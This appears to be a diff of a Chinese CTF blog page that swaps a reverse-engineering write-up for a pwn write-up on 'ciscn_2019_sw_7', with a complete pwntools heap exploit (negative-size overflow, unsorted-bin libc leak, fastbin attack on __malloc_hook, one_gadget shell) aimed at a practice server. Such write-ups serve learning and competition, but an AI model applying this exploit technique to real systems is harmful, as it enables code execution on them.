@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……   ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const ch">
+<meta name="description" content="🐛">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CGCTF-480小时精通c++">
-<meta property="og:url" content="http://yoursite.com/2018/09/21/480小时/index.html">
+<meta property="og:title" content="ciscn_2019_sw_7">
+<meta property="og:url" content="http://yoursite.com/2019/09/25/ciscn-2019-sw-7/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……   ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const ch">
+<meta property="og:description" content="🐛">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-05T15:35:53.000Z">
+<meta property="og:updated_time" content="2019-09-25T13:18:40.937Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CGCTF-480小时精通c++">
-<meta name="twitter:description" content="听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……   ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const ch">
+<meta name="twitter:title" content="ciscn_2019_sw_7">
+<meta name="twitter:description" content="🐛">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>CGCTF-480小时精通c++ | 4eriri&#39;s blog</title>
+<title>ciscn_2019_sw_7 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -200,11 +200,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-480小时" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ciscn-2019-sw-7" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/09/21/480小时/" class="article-date">
-      <time datetime="2018-09-20T16:52:52.000Z" itemprop="datePublished">2018-09-21</time>
+      <a href="/2019/09/25/ciscn-2019-sw-7/" class="article-date">
+      <time datetime="2019-09-25T13:14:14.000Z" itemprop="datePublished">2019-09-25</time>
 </a>
 
 
@@ -219,7 +219,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      CGCTF-480小时精通c++
+      ciscn_2019_sw_7
     </h1>
   
 
@@ -236,22 +236,11 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先……</p>
-<p>题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……</p>
-<p>  ida启动！main函数伪代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+Ch] [rbp-54h]</span><br><span class="line">  __int64 v5; // [rsp+10h] [rbp-50h]</span><br><span class="line">  __int64 v6; // [rsp+18h] [rbp-48h]</span><br><span class="line">  __int64 v7; // [rsp+20h] [rbp-40h]</span><br><span class="line">  __int64 v8; // [rsp+28h] [rbp-38h]</span><br><span class="line">  int v9; // [rsp+30h] [rbp-30h]</span><br><span class="line">  char v10; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned __int64 v11; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  v5 = 7652827924304847970LL;</span><br><span class="line">  v6 = 6588269719570178159LL;</span><br><span class="line">  v7 = 0615273543157435660505LL;</span><br><span class="line">  v8 = 4932672475662219355LL;</span><br><span class="line">  v9 = 2099869557;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)&quot;The Encrypted Flag is: &quot;);</span><br><span class="line">  for ( i = 0; i &lt;= 35; ++i )</span><br><span class="line">    printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v5 + i));</span><br><span class="line">  std::ostream::operator&lt;&lt;((__int64)&amp;std::cout, (__int64)std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>很容易发现输出了加密后的flag，也就是v5-v9中的值，按r键转换成字符型，得加密flag:bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}</p>
-<p>进入汇编界面发现输出”The Encrypted Flag is: “前被nop了一段，应该就是加密函数。</p>
-<p>左侧函数列表中有480个名为_X1C_CG_EncryptFunction的函数，实现output[i]^=string[i%len(string)]^i，区别就是这480个函数中的string是从“001001001”到“480480480”。所以可以知道flag经过了这480个函数的加密后，就变成了bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}。</p>
-<p>逆运算脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">key=[]</span><br><span class="line">for i in range(1,481):</span><br><span class="line">	n=str(i)</span><br><span class="line">	key.append(n.zfill(3)*3)</span><br><span class="line">final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;</span><br><span class="line">flag=final</span><br><span class="line">for i in range(479,-1,-1):</span><br><span class="line">	a=key[i]</span><br><span class="line">	for j in range(35,-1,-1):</span><br><span class="line">			s=ord(flag[j])</span><br><span class="line">			s^=ord(a[j%9])^j</span><br><span class="line">			flag=flag.replace(flag[j],chr(s),1)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
-<p><del>于是得到了flag</del></p>
-<p>可能由于并不会替换字符串中特定下标处的值，所以并没有得到flag……向大佬求救尚未得到回复……</p>
-<h2 id="两小时后"><a href="#两小时后" class="headerlink" title="两小时后"></a><strong><em>两小时后</em></strong></h2><p>原因没错，通过百度了一会python中字符串替换的问题，找到了正确的替换方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">key=[]</span><br><span class="line">for i in range(1,481):</span><br><span class="line">	n=str(i)</span><br><span class="line">	key.append(n.zfill(3)*3)</span><br><span class="line">final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;</span><br><span class="line">flag=final</span><br><span class="line">flag1=list(flag)</span><br><span class="line">for i in range(479,-1,-1):</span><br><span class="line">	a=key[i]</span><br><span class="line">	for j in range(36):</span><br><span class="line">			s=ord(flag1[j])</span><br><span class="line">			s^=ord(a[j%9])^j</span><br><span class="line">			flag1[j]=chr(s)</span><br><span class="line">flag=&apos;&apos;.join(flag1)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
-<p><strong>flag get！</strong></p>
-<p>通过大佬的指点终于是完成了这一道简单题，明明知道了怎么去逆运算，结果因为python不会用的原因忙了这么久……要学的太多</p>
-
+        <p>🐛<br><a id="more"></a></p>
+<p>new的时候如果size输个-1，分配一块大小为0x20的chunk0，同时可以输入0xffffffff个字符，产生了堆溢出。利用这一点修改chunk1的size为0x91，free掉，产生unsorted bin，之后切割unsorted bin，使得chunk2的fd为main_arena+88，使用show功能获取leak。</p>
+<p>之后就是fastbin打malloc_hook放onegadget。</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#sh=process(&quot;./ciscn_2019_sw_7.dms&quot;)</span><br><span class="line">sh=remote(&quot;pwn.buuoj.cn&quot;,20134)</span><br><span class="line">libc=ELF(&quot;x64_libc.so.6&quot;)</span><br><span class="line">onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">def new(size,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;note:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;note:&quot;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def delete(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">new(0x10,&apos;a&apos;)#0</span><br><span class="line">new(0x10,&apos;b&apos;)#1</span><br><span class="line">new(0x60,&apos;c&apos;)#2</span><br><span class="line">new(0x60,&apos;d&apos;)#3</span><br><span class="line">new(0x60,&apos;e&apos;)#4</span><br><span class="line">delete(0)</span><br><span class="line">new(-1,p64(0)*2+p64(0x91))#0</span><br><span class="line">delete(1)</span><br><span class="line">new(0x10,&apos;a&apos;)#1</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&quot;2 : &quot;)</span><br><span class="line">leak=u64(sh.recv(6)+&apos;\x00\x00&apos;)</span><br><span class="line">mallochook=leak-88-0x10</span><br><span class="line">log.success(&quot;mallochook: &quot;+hex(mallochook))</span><br><span class="line">libcbase=leak-88-0x3C4B20</span><br><span class="line">log.success(&quot;libcbase: &quot;+hex(libcbase))</span><br><span class="line">delete(3)</span><br><span class="line">delete(0)</span><br><span class="line">new(-1,p64(0)*2+p64(0x21)+p64(0)*3+p64(0x71)+p64(leak)*2+p64(0)*10+p64(0x70)*2+p64(mallochook-0x23))#0</span><br><span class="line">new(0x60,&apos;a&apos;)</span><br><span class="line">new(0x60,&apos;\x00&apos;*11+p64(libcbase+onegadget[2]))</span><br><span class="line">sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;note:&quot;)</span><br><span class="line">sh.sendline(&quot;4eriri&quot;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -259,13 +248,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/09/21/480小时/">CGCTF-480小时精通c++</a></p>
+        <p><span>本文标题:</span><a href="/2019/09/25/ciscn-2019-sw-7/">ciscn_2019_sw_7</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-09-21, 00:52:52</p>
-        <p><span>最后更新:</span>2019-03-05, 23:35:53</p>
+        <p><span>发布时间:</span>2019-09-25, 21:14:14</p>
+        <p><span>最后更新:</span>2019-09-25, 21:18:40</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/09/21/480小时/" title="CGCTF-480小时精通c++">http://yoursite.com/2018/09/21/480小时/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/21/480小时/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/09/25/ciscn-2019-sw-7/" title="ciscn_2019_sw_7">http://yoursite.com/2019/09/25/ciscn-2019-sw-7/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/09/25/ciscn-2019-sw-7/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -277,12 +266,12 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/09/22/base64/">
-                    base64
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/09/24/中关村2019-one-string/">
+                    [中关村2019]one_string
                 </a>
             </div>
-        
         
     </nav>
 
@@ -292,7 +281,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#两小时后"><span class="toc-number">1.</span> <span class="toc-text">两小时后</span></a></li></ol>
+            
         
     </div>
     <style>
@@ -328,7 +317,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"CGCTF-480小时精通c++　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ciscn_2019_sw_7　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -347,8 +336,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2018/09/21/480小时/';
-            this.page.identifier = '2018/09/21/480小时/';
+            this.page.url = 'http://yoursite.com/2019/09/25/ciscn-2019-sw-7/';
+            this.page.identifier = '2019/09/25/ciscn-2019-sw-7/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -370,15 +359,15 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/09/22/base64/" title="上一篇: base64">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2019/09/24/中关村2019-one-string/" title="下一篇: [中关村2019]one_string">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
 
